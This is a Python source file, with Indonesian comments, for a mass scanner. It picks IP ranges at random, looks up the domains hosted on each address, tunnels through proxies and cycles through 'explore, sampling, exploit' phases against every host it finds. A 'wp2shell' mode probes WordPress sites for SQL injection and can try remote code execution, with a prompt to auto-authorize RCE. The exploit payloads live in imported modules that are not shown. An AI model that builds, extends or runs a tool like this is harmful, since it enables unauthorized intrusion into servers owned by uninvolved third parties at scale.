# main.py - FULL VERSION WITH WP2SHELL CONTINUOUS SCAN
import os
import sys
import signal
import atexit
import time
from config import Config
from proxy_manager import ProxyManager
from cache_manager import CacheManager
from scanner import MovableTypeScanner
from ip_generator import IPGenerator

class MovableTypeMassScanner:
    def __init__(self):
        self.proxy_manager = None
        self.cache_manager = None
        self.scanner = None
        self.ip_generator = None
        self.running = True
        
        # Variabel untuk status bar dan counter
        self.skip_counter = 0
        self.total_ips_processed = 0
        self.total_mt = 0
        self.total_mtv4 = 0
        self.current_cycle = 0
        
        # State management untuk continuous mode
        self.scan_level = 1  # 1, 2
        self.scan_phase = None  # 'explore', 'sampling', 'exploit'
        self.current_base_three_octets = None  # Base untuk exploit mode
        
        # Counter wp2shell
        self.total_wp2shell = 0
        self.total_wp2shell_rce = 0
        self.rce_authorized = False
        
        # Setup signal handlers
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
        
        # Register cleanup
        atexit.register(self.cleanup)
    
    def signal_handler(self, signum, frame):
        """Handle Ctrl+C"""
        print("\n\n[!] Received interrupt signal. Cleaning up...")
        self.running = False
        self.cleanup()
        sys.exit(0)
    
    def cleanup(self):
        """Bersihkan resources"""
        print("[*] Cleaning up resources...")
        
        if self.cache_manager:
            # PATCH MEMORY 10-28: flush buffer L1 write-back + processed_ips.txt
            # ke SQLite/disk sebelum tutup, lalu tutup koneksi
            try:
                self.cache_manager.flush_all()
                stats = self.cache_manager.get_stats()
                print(f"[*] Cache stats: {stats}")
                self.cache_manager.close()
            except Exception as e:
                print(f"[-] cache cleanup error: {e}")
        
        if self.proxy_manager:
            self.proxy_manager.print_stats()
            self.proxy_manager.stop()
        
        print("[✓] Cleanup completed")
    
    def print_header(self):
        """Tampilkan header"""
        print("""
    ╔════════════════════════════════════════════════════════════╗
    ║         Movable Type Mass Scanner v2.0 (Enterprise)        ║
    ║  - Auto Proxy Refresh (30 menit)                           ║
    ║  - SQLite Cache System                                     ║
    ║  - True Continuous Mode                                    ║
    ║  - Smart Level 2 Sampling (cukup 1 IP bagus)               ║
    ║  - IP Validation di Level 2                                ║
    ║  - NEW: WordPress wp2shell Continuous Scan                 ║
    ║  - Run for Days Without Issues                             ║
    ╚════════════════════════════════════════════════════════════╝
        """)
    
    def update_status_bar(self):
        """Update single-line status bar"""
        current_time = time.strftime("%H:%M")
        
        if self.scan_level == 1:
            mode = "L1"
        elif self.scan_phase == 'explore':
            mode = "L2-EXP"
        elif self.scan_phase == 'sampling':
            mode = "L2-SMP"
        else:
            mode = "L2-EPT"
        
        status_text = f"\r[{current_time}] {mode} | IP: {self.total_ips_processed} | MT: {self.total_mt} | MTv4: {self.total_mtv4} | SKIP: {self.skip_counter}"
        sys.stdout.write(status_text.ljust(80))
        sys.stdout.flush()
    
    def update_status_bar_wp2shell(self):
        """Status bar untuk wp2shell"""
        current_time = time.strftime("%H:%M")
        mode = "L1" if self.scan_level == 1 else f"L2-{self.scan_phase.upper()[:3]}"
        status = f"\r[{current_time}] {mode} | IP: {self.total_ips_processed} | WP2: {self.total_wp2shell} | RCE: {self.total_wp2shell_rce} | SKIP: {self.skip_counter}"
        sys.stdout.write(status.ljust(80))
        sys.stdout.flush()
    
    def increment_mt(self):
        self.total_mt += 1
        self.update_status_bar()
    
    def increment_mtv4(self):
        self.total_mtv4 += 1
        self.update_status_bar()
    
    def increment_wp2shell(self):
        self.total_wp2shell += 1
        self.update_status_bar_wp2shell()
    
    def increment_wp2shell_rce(self):
        self.total_wp2shell_rce += 1
        self.update_status_bar_wp2shell()
    
    def sample_base_quality(self, base_three_octets):
        """
        Sample IP VALID dari base untuk cek kualitas
        Mencari SAMPLE_SIZE IP valid dari base, lalu test reverse IP
        
        LOGIKA: Base lolos jika ADA MINIMAL 1 sample yang memiliki ≥MIN_DOMAINS_PER_IP domains
        
        Args:
            base_three_octets: contoh "157.7.109."
        
        Returns:
            (is_good, sampled_ips, domain_counts, good_ip): 
                is_good: True jika ada minimal 1 sample bagus
                sampled_ips: list IP yang sudah di-sample
                domain_counts: dict {ip: domain_count} untuk report
                good_ip: IP pertama yang bagus (None jika tidak ada)
        """
        print(f"\n{'─'*50}")
        print(f"[SAMPLING] Base: {base_three_octets}x")
        print(f"[SAMPLING] Mencari {Config.SAMPLE_SIZE} IP VALID dari base ini...")
        print(f"[SAMPLING] Threshold: minimal {Config.MIN_DOMAINS_PER_IP} domains per IP")
        print(f"[SAMPLING] Syarat lolos: minimal 1 dari {Config.SAMPLE_SIZE} sample memiliki ≥{Config.MIN_DOMAINS_PER_IP} domains")
        print(f"{'─'*50}")
        
        # Cari IP valid dari base ini
        valid_ips = self.ip_generator.get_valid_ips_from_base(
            base_three_octets, 
            max_ips=Config.SAMPLE_SIZE,
            max_attempts=500
        )
        
        if len(valid_ips) < 1:
            print(f"\n[SAMPLING] ✗ BASE REJECTED!")
            print(f"[SAMPLING] No valid IPs found in this base")
            return False, [], {}, None
        
        print(f"\n[SAMPLING] Found {len(valid_ips)} valid IPs, testing all {Config.SAMPLE_SIZE} samples...")
        print(f"{'─'*50}")
        
        sampled_ips = []
        domain_counts = {}
        good_ip = None
        good_count = 0
        bad_ips = []
        
        # CEK SEMUA SAMPLE (tidak berhenti di tengah)
        for idx, ip in enumerate(valid_ips[:Config.SAMPLE_SIZE], 1):
            sampled_ips.append(ip)
            
            # Cek apakah IP sudah diproses sebelumnya
            if self.cache_manager.is_ip_processed(ip):
                print(f"  [{idx:2d}] {ip} → [CACHED] skipping test")
                domain_counts[ip] = -1
                continue
            
            print(f"  [{idx:2d}] {ip} → checking reverse IP...", end=" ", flush=True)
            
            # PATCH 10-28: tntcode DICABUT (Cloudflare) — pakai hackertarget saja.
            domains_ht = self.scanner.reverse_ip_hackertarget(ip)
            
            # Gabungkan domain unik
            all_domains = set(domains_ht)
            domain_count = len(all_domains)
            domain_counts[ip] = domain_count
            
            if domain_count >= Config.MIN_DOMAINS_PER_IP:
                print(f"✓ {domain_count} domains (GOOD)")
                good_count += 1
                if good_ip is None:
                    good_ip = ip
            else:
                print(f"✗ {domain_count} domains (BAD - need {Config.MIN_DOMAINS_PER_IP})")
                bad_ips.append(ip)
        
        # Tampilkan ringkasan
        print(f"{'─'*50}")
        print(f"[SAMPLING] Hasil: {good_count} GOOD, {len(bad_ips)} BAD, {Config.SAMPLE_SIZE - good_count - len(bad_ips)} CACHED")
        
        # EVALUASI: apakah ada minimal 1 sample bagus?
        if good_count >= 1:
            print(f"[SAMPLING] ✓ BASE QUALIFIED! (found {good_count} good sample(s))")
            if good_ip:
                print(f"[SAMPLING] Contoh IP bagus: {good_ip} ({domain_counts[good_ip]} domains)")
            return True, sampled_ips, domain_counts, good_ip
        else:
            print(f"[SAMPLING] ✗ BASE REJECTED! (no sample reached {Config.MIN_DOMAINS_PER_IP} domains)")
            return False, sampled_ips, domain_counts, None
    
    def run(self):
        """Main execution"""
        self.print_header()
        
        # Inisialisasi komponen
        print("[*] Initializing components...")
        
        # Proxy Manager
        print("[*] Starting Proxy Manager...")
        self.proxy_manager = ProxyManager()
        
        # Cache Manager
        print("[*] Starting Cache Manager...")
        self.cache_manager = CacheManager()
        
        # Scanner (kirim referensi self untuk update counter)
        self.scanner = MovableTypeScanner(self.proxy_manager, self.cache_manager, self)
        
        # IP Generator
        self.ip_generator = IPGenerator(self.cache_manager)
        
        # Pilih metode
        print("\n" + "="*50)
        print("SELECT INPUT METHOD")
        print("="*50)
        print("1. Scan from IP list file")
        print("2. Scan with RNG IP (single batch)")
        print("3. True Continuous Scan (Movable Type)")
        print("4. Show statistics")
        print("5. WordPress wp2shell Continuous Scan (NEW)")
        
        choice = input("\nChoice (1-5): ").strip()
        
        if choice == '1':
            self.scan_from_file()
        elif choice == '2':
            self.scan_with_rng()
        elif choice == '3':
            self.continuous_scan()
        elif choice == '4':
            self.show_stats()
        elif choice == '5':
            self.continuous_scan_wp2shell()
        else:
            print("[!] Invalid choice!")
    
    def scan_from_file(self):
        """Scan dari file"""
        filename = input("IP list file: ").strip()
        
        try:
            with open(filename, 'r') as f:
                ips = [line.strip() for line in f if line.strip()]
            
            print(f"[*] Loaded {len(ips)} IPs")
            
            from concurrent.futures import ThreadPoolExecutor, as_completed
            
            with ThreadPoolExecutor(max_workers=Config.MAX_THREADS_REVERSE) as executor:
                futures = []
                for ip in ips:
                    if not self.running:
                        break
                    
                    if not self.cache_manager.is_ip_processed(ip):
                        futures.append(executor.submit(self.scanner.process_ip, ip))
                    else:
                        print(f"[↺] Skipping cached IP: {ip}")
                
                for future in as_completed(futures):
                    if not self.running:
                        break
                    try:
                        future.result()
                    except Exception as e:
                        print(f"[-] Error: {e}")
                        
        except Exception as e:
            print(f"[!] Error: {e}")
    
    def scan_with_rng(self):
        """Scan dengan RNG IP (single batch)"""
        base_ip = input("Base IP (e.g., 157.7.44): ").strip()
        
        if base_ip.count('.') == 2:
            base_ip = base_ip + '.1'
        
        try:
            max_valid = input(f"Number of IPs (default {Config.MAX_VALID_RNG}): ").strip()
            if max_valid:
                max_valid = min(int(max_valid), Config.MAX_VALID_RNG_LIMIT)
            else:
                max_valid = Config.MAX_VALID_RNG
        except:
            max_valid = Config.MAX_VALID_RNG
        
        print(f"[*] Will generate up to {max_valid} valid IPs")
        
        self.ip_generator.stream_ips(
            base_ip, 
            self.scanner.process_ip,
            max_valid
        )
    
    def continuous_scan(self):
        """
        TRUE CONTINUOUS SCAN MODE - WITH SMART LEVEL 2 SAMPLING
        Level 1: Scan ALL 254 IPs dari 3 oktet base
        Level 2 Explore: Mencari base 3 oktet baru (acak X dan Y) - HANYA IP VALID
        Level 2 Sampling: Test 10 IP VALID dari base yang ditemukan
        Level 2 Exploit: Scan FULL jika minimal 1 sample ≥20 domains
        """
        print("\n" + "="*60)
        print("TRUE CONTINUOUS SCAN MODE (WITH SMART SAMPLING)")
        print("="*60)
        print("[*] Press Ctrl+C to stop")
        print("[*] Level 1: Scan semua 254 IP dari 3 oktet base")
        print("[*] Level 2 Explore: Mencari base 3 oktet baru (acak X dan Y)")
        print(f"[*] Level 2 Sampling: Test {Config.SAMPLE_SIZE} IP VALID dari base")
        print(f"[*] Level 2 Exploit: Scan FULL jika minimal 1 sample ≥{Config.MIN_DOMAINS_PER_IP} domains")
        print("[*] Tools akan terus berjalan sampai Ctrl+C\n")
        
        # Input base IP untuk Level 1 (3 oktet)
        base_input = input("Base IP untuk Level 1 (3 oktet, e.g., 157.7.44): ").strip()
        
        # Validasi input
        if base_input.count('.') != 2:
            print("[!] Please enter 3 octets (e.g., 157.7.44)")
            return
        
        # Siapkan base untuk Level 1 (tambahkan .1 untuk format)
        base_level1 = base_input + '.1'
        
        # Siapkan base untuk Level 2 (2 oktet pertama)
        base_two_octets = base_input[:base_input.rfind('.')] + '.'
        
        # Reset semua counters
        self.total_ips_processed = 0
        self.total_mt = 0
        self.total_mtv4 = 0
        self.skip_counter = 0
        self.current_cycle = 0
        
        # Reset state management
        self.scan_level = 1
        self.scan_phase = None
        self.current_base_three_octets = None
        
        print(f"\n[*] Level 1 base: {base_input}.x")
        print(f"[*] Level 2 base: {base_two_octets}x.y")
        print(f"[*] Sampling threshold: {Config.MIN_DOMAINS_PER_IP} domains per IP (cukup 1 IP bagus)")
        print(f"[*] Memulai scan...\n")
        
        self.update_status_bar()
        print()
        
        while self.running:
            
            # ========== LEVEL 1: SCAN SEMUA 254 IP ==========
            if self.scan_level == 1:
                print(f"\n{'='*60}")
                print(f"[LEVEL 1] - Scanning semua 254 IP dari {base_input}.x")
                print(f"{'='*60}")
                
                valid_ips_found = 0
                
                for ip in self.ip_generator.generate_ips_level1_full(base_level1):
                    if not self.running:
                        break
                    
                    # Cek cache dulu
                    if self.cache_manager.is_ip_processed(ip):
                        print(f"[↺] Skipping cached IP: {ip}")
                    else:
                        self.total_ips_processed += 1
                        self.scanner.process_ip(ip)
                        valid_ips_found += 1
                        self.update_status_bar()
                
                # Level 1 selesai, langsung pindah ke Level 2 Explore
                print(f"\n\n{'!'*60}")
                print(f"[!] LEVEL 1 COMPLETED!")
                print(f"[!] Total valid IPs found: {valid_ips_found}")
                print(f"[!] Switching to LEVEL 2 (Explore Mode)...")
                print(f"{'!'*60}\n")
                
                self.scan_level = 2
                self.scan_phase = 'explore'
                self.skip_counter = 0
                self.current_base_three_octets = None
                time.sleep(2)
            
            # ========== LEVEL 2 EXPLORE: MENCARI BASE BARU (HANYA IP VALID) ==========
            elif self.scan_level == 2 and self.scan_phase == 'explore':
                print(f"\n{'='*60}")
                print(f"[LEVEL 2 - EXPLORE MODE] - Mencari base 3 oktet baru")
                print(f"Base: {base_two_octets}x.y")
                print(f"HANYA IP VALID (ada PTR record) yang akan diproses")
                print(f"Setelah menemukan base, akan di-sample {Config.SAMPLE_SIZE} IP")
                print(f"{'='*60}")
                
                found_new_base = False
                
                for ip in self.ip_generator.generate_ips_level2_explore(base_two_octets, Config.MAX_VALID_RNG):
                    if not self.running:
                        break
                    
                    if self.cache_manager.is_ip_processed(ip):
                        # SKIP - IP sudah pernah diproses
                        self.skip_counter += 1
                        self.update_status_bar()
                        
                        # Jika skip mencapai 500 tanpa nemu IP baru, reset dan lanjut cari
                        if self.skip_counter >= 500:
                            print(f"\n[!] Skip counter reached 500 without new IP in Explore mode!")
                            print(f"[!] Resetting and continuing search...")
                            self.skip_counter = 0
                            break
                        
                    else:
                        # IP BARU VALID DITEMUKAN!
                        found_new_base = True
                        self.total_ips_processed += 1
                        self.scanner.process_ip(ip)
                        self.update_status_bar()
                        
                        # Ekstrak 3 oktet dari IP yang ditemukan
                        ip_parts = ip.split('.')
                        if len(ip_parts) == 4:
                            new_base = '.'.join(ip_parts[:3]) + '.'
                            
                            print(f"\n{'*'*60}")
                            print(f"[✓] FOUND NEW BASE IN EXPLORE MODE!")
                            print(f"[✓] IP: {ip}")
                            print(f"[✓] New base 3 oktet: {new_base}")
                            print(f"[✓] Moving to SAMPLING phase...")
                            print(f"{'*'*60}\n")
                            
                            # Pindah ke sampling phase
                            self.scan_phase = 'sampling'
                            self.current_base_three_octets = new_base
                            self.skip_counter = 0
                            break
                
                # Jika tidak menemukan base baru dalam cycle ini, lanjut explore lagi
                if not found_new_base and self.running and self.scan_phase == 'explore':
                    print(f"\n[*] No new base found in this explore cycle")
                    print(f"[*] Continuing explore mode...")
                    time.sleep(5)
            
            # ========== LEVEL 2 SAMPLING: TEST KUALITAS BASE ==========
            elif self.scan_level == 2 and self.scan_phase == 'sampling':
                print(f"\n{'='*60}")
                print(f"[LEVEL 2 - SAMPLING PHASE] - Testing base quality")
                print(f"Base: {self.current_base_three_octets}x")
                print(f"{'='*60}")
                
                # Lakukan sampling quality check
                is_good_base, sampled_ips, domain_counts, good_ip = self.sample_base_quality(self.current_base_three_octets)
                
                # Tandai sample IP sebagai processed (agar tidak diproses ulang)
                for ip in sampled_ips:
                    if not self.cache_manager.is_ip_processed(ip):
                        status = 'sampled_good' if domain_counts.get(ip, 0) >= Config.MIN_DOMAINS_PER_IP else 'sampled_bad'
                        self.cache_manager.mark_ip_processed(ip, status)
                
                if not is_good_base:
                    print(f"\n[!] Base {self.current_base_three_octets}x is LOW QUALITY!")
                    print(f"[!] No sample met the {Config.MIN_DOMAINS_PER_IP} domains threshold")
                    print(f"[!] Skipping full scan, returning to EXPLORE mode...")
                    
                    # Kembali ke explore mode
                    self.scan_phase = 'explore'
                    self.current_base_three_octets = None
                    self.skip_counter = 0
                    time.sleep(2)
                    continue  # Langsung lanjut ke cycle berikutnya
                
                # BASE BAGUS (ada minimal 1 sample bagus), lanjut ke exploit mode
                print(f"\n[✓] Base {self.current_base_three_octets}x is HIGH QUALITY!")
                print(f"[✓] Found at least 1 good IP (example: {good_ip} with {domain_counts.get(good_ip, 0)} domains)")
                print(f"[✓] Proceeding to EXPLOIT mode (full scan of 1-254)...")
                
                self.scan_phase = 'exploit'
                time.sleep(2)
            
            # ========== LEVEL 2 EXPLOIT: SCAN SEMUA 254 IP DARI BASE ==========
            elif self.scan_level == 2 and self.scan_phase == 'exploit':
                print(f"\n{'='*60}")
                print(f"[LEVEL 2 - EXPLOIT MODE] - Scanning ALL 254 IPs")
                print(f"Base: {self.current_base_three_octets}x")
                print(f"HANYA IP VALID (ada PTR record) yang akan diproses")
                print(f"{'='*60}")
                
                valid_ips_found = 0
                
                for ip in self.ip_generator.generate_ips_level2_exploit_full(self.current_base_three_octets):
                    if not self.running:
                        break
                    
                    # Skip jika IP sudah diproses (termasuk sample yang sudah di-reverse)
                    if self.cache_manager.is_ip_processed(ip):
                        print(f"[↺] Skipping cached IP: {ip}")
                        continue
                    
                    self.total_ips_processed += 1
                    self.scanner.process_ip(ip)
                    valid_ips_found += 1
                    self.update_status_bar()
                
                # Exploit mode selesai, kembali ke explore mode
                print(f"\n\n{'!'*60}")
                print(f"[!] LEVEL 2 EXPLOIT COMPLETED!")
                print(f"[!] Base: {self.current_base_three_octets}x")
                print(f"[!] Total valid IPs found: {valid_ips_found}")
                print(f"[!] Returning to EXPLORE MODE to find new base...")
                print(f"{'!'*60}\n")
                
                self.scan_phase = 'explore'
                self.current_base_three_octets = None
                self.skip_counter = 0
                time.sleep(2)
            
            # Status update periodik
            if self.running and self.scan_phase != 'sampling':
                print(f"\n[#] STATUS UPDATE")
                print(f"    Total IP processed: {self.total_ips_processed}")
                print(f"    Total MT found: {self.total_mt}")
                print(f"    Total MTv4 found: {self.total_mtv4}")
                if self.scan_level == 1:
                    print(f"    Current mode: Level 1")
                elif self.scan_phase == 'explore':
                    print(f"    Current mode: Level 2 Explore (skip: {self.skip_counter})")
                elif self.scan_phase == 'sampling':
                    print(f"    Current mode: Level 2 Sampling (base: {self.current_base_three_octets})")
                else:
                    print(f"    Current mode: Level 2 Exploit (base: {self.current_base_three_octets}x)")
                self.update_status_bar()
    
    def continuous_scan_wp2shell(self):
        """Continuous scan khusus WordPress wp2shell"""
        print("\n" + "="*60)
        print("WORDPRESS WP2SHELL CONTINUOUS SCAN")
        print("="*60)
        print("[*] Alur: Reverse IP -> Domain -> wp2shell exploit -> next IP")
        print("[*] Press Ctrl+C to stop")
        print("[*] Level 1: Scan semua 254 IP dari 3 oktet base")
        print("[*] Level 2: Cari base baru, sample, exploit")
        print(f"[*] Sampling: {Config.SAMPLE_SIZE} IP VALID per base")
        print(f"[*] Syarat lolos: minimal 1 sample dengan ≥{Config.MIN_DOMAINS_PER_IP} domains")
        print()

        # Import scanner wp2shell
        # PATCH 10-28: modul 'wp2shell' (BatchClient, dll.) ada di /sdcard/wp2shell,
        # bukan site-packages. Tambahkan ke sys.path sebelum import agar fitur 5 jalan.
        if '/sdcard/wp2shell' not in sys.path:
            sys.path.insert(0, '/sdcard/wp2shell')
        from wp2shell_scanner import Wp2shellScanner

        base_input = input("Base IP untuk Level 1 (3 oktet, e.g., 157.7.44): ").strip()
        if base_input.count('.') != 2:
            print("[!] Please enter 3 octets (e.g., 157.7.44)")
            return

        # Opsi RCE
        do_rce = input("Attempt RCE after SQLi confirm? (y/N): ").strip().lower() == 'y'
        if do_rce:
            self.rce_authorized = input("Auto-authorize RCE? (y/N): ").strip().lower() == 'y'

        # Inisialisasi scanner wp2shell
        self.wp2shell_scanner = Wp2shellScanner(
            cache_manager=self.cache_manager,
            main_reference=self,
            timeout=40.0,
            sleep=5.0,
            rounds=3,
            do_rce=do_rce
        )

        # Siapkan IP generator
        base_level1 = base_input + '.1'
        base_two_octets = base_input[:base_input.rfind('.')] + '.'

        # Reset counters
        self.total_ips_processed = 0
        self.total_wp2shell = 0
        self.total_wp2shell_rce = 0
        self.skip_counter = 0
        self.scan_level = 1
        self.scan_phase = None
        self.current_base_three_octets = None

        print(f"\n[*] Level 1 base: {base_input}.x")
        print(f"[*] Level 2 base: {base_two_octets}x.y")
        self.update_status_bar_wp2shell()
        print()

        while self.running:
            # ========== LEVEL 1 ==========
            if self.scan_level == 1:
                print(f"\n{'='*60}")
                print(f"[LEVEL 1] Scanning semua 254 IP dari {base_input}.x")
                print(f"{'='*60}")

                for ip in self.ip_generator.generate_ips_level1_full(base_level1):
                    if not self.running:
                        break
                    if self.cache_manager.is_ip_processed(ip):
                        print(f"[↺] Skipping cached IP: {ip}")
                    else:
                        self.total_ips_processed += 1
                        self.wp2shell_scanner.process_ip(ip)
                        self.update_status_bar_wp2shell()

                print(f"\n[!] LEVEL 1 COMPLETED. Switching to LEVEL 2...")
                self.scan_level = 2
                self.scan_phase = 'explore'
                self.skip_counter = 0
                time.sleep(2)

            # ========== LEVEL 2 EXPLORE ==========
            elif self.scan_level == 2 and self.scan_phase == 'explore':
                print(f"\n{'='*60}")
                print(f"[LEVEL 2 EXPLORE] Mencari base baru dari {base_two_octets}x.y")
                print(f"{'='*60}")

                found_base = False
                for ip in self.ip_generator.generate_ips_level2_explore(base_two_octets, Config.MAX_VALID_RNG):
                    if not self.running:
                        break
                    if self.cache_manager.is_ip_processed(ip):
                        self.skip_counter += 1
                        self.update_status_bar_wp2shell()
                        if self.skip_counter >= 500:
                            print(f"\n[!] Skip counter reached 500, resetting...")
                            self.skip_counter = 0
                            break
                    else:
                        # IP baru ditemukan
                        self.total_ips_processed += 1
                        self.wp2shell_scanner.process_ip(ip)
                        self.update_status_bar_wp2shell()

                        ip_parts = ip.split('.')
                        if len(ip_parts) == 4:
                            new_base = '.'.join(ip_parts[:3]) + '.'
                            print(f"\n[✓] Found new base: {new_base}")
                            self.current_base_three_octets = new_base
                            self.scan_phase = 'sampling'
                            self.skip_counter = 0
                            found_base = True
                            break

                if not found_base and self.running:
                    print(f"\n[*] No new base found, continuing explore...")
                    time.sleep(5)

            # ========== LEVEL 2 SAMPLING ==========
            elif self.scan_level == 2 and self.scan_phase == 'sampling':
                print(f"\n{'='*60}")
                print(f"[LEVEL 2 SAMPLING] Testing base: {self.current_base_three_octets}x")
                print(f"{'='*60}")

                is_good, sampled_ips, domain_counts, good_ip = self.sample_base_quality(
                    self.current_base_three_octets
                )

                # Tandai sample IP sebagai processed
                for ip in sampled_ips:
                    if not self.cache_manager.is_ip_processed(ip):
                        status = 'sampled_good' if domain_counts.get(ip, 0) >= Config.MIN_DOMAINS_PER_IP else 'sampled_bad'
                        self.cache_manager.mark_ip_processed(ip, status)

                if not is_good:
                    print(f"[!] Base {self.current_base_three_octets}x rejected, returning to EXPLORE")
                    self.scan_phase = 'explore'
                    self.current_base_three_octets = None
                    time.sleep(2)
                    continue

                print(f"[✓] Base qualified, proceeding to EXPLOIT...")
                self.scan_phase = 'exploit'
                time.sleep(2)

            # ========== LEVEL 2 EXPLOIT ==========
            elif self.scan_level == 2 and self.scan_phase == 'exploit':
                print(f"\n{'='*60}")
                print(f"[LEVEL 2 EXPLOIT] Scanning ALL 254 IP dari {self.current_base_three_octets}x")
                print(f"{'='*60}")

                for ip in self.ip_generator.generate_ips_level2_exploit_full(self.current_base_three_octets):
                    if not self.running:
                        break
                    if self.cache_manager.is_ip_processed(ip):
                        print(f"[↺] Skipping cached IP: {ip}")
                        continue
                    self.total_ips_processed += 1
                    self.wp2shell_scanner.process_ip(ip)
                    self.update_status_bar_wp2shell()

                print(f"\n[!] EXPLOIT COMPLETED. Returning to EXPLORE...")
                self.scan_phase = 'explore'
                self.current_base_three_octets = None
                time.sleep(2)

            # Status update periodik
            if self.running:
                print(f"\n[#] STATUS: IP={self.total_ips_processed} | WP2SHELL={self.total_wp2shell} | RCE={self.total_wp2shell_rce}")
                self.update_status_bar_wp2shell()

    def show_stats(self, quiet=False):
        """Tampilkan statistik"""
        if not quiet:
            print("\n" + "="*60)
            print("SYSTEM STATISTICS")
            print("="*60)
        
        cache_stats = self.cache_manager.get_stats()
        print(f"\n📦 Cache Database:")
        for table, count in cache_stats.items():
            if isinstance(count, (int, float)):
                print(f"  - {table}: {count}")
        
        self.proxy_manager.print_stats()
        
        print("\n📁 Output Files:")
        for name, filename in Config.OUTPUT_FILES.items():
            if os.path.exists(filename):
                size = os.path.getsize(filename) / 1024
                print(f"  - {filename}: {size:.2f} KB")
            elif os.path.exists(Config.TEMP_DIR + filename):
                size = os.path.getsize(Config.TEMP_DIR + filename) / 1024
                print(f"  - {filename} (temp): {size:.2f} KB")


def main():
    scanner = MovableTypeMassScanner()
    scanner.run()


if __name__ == "__main__":
    main()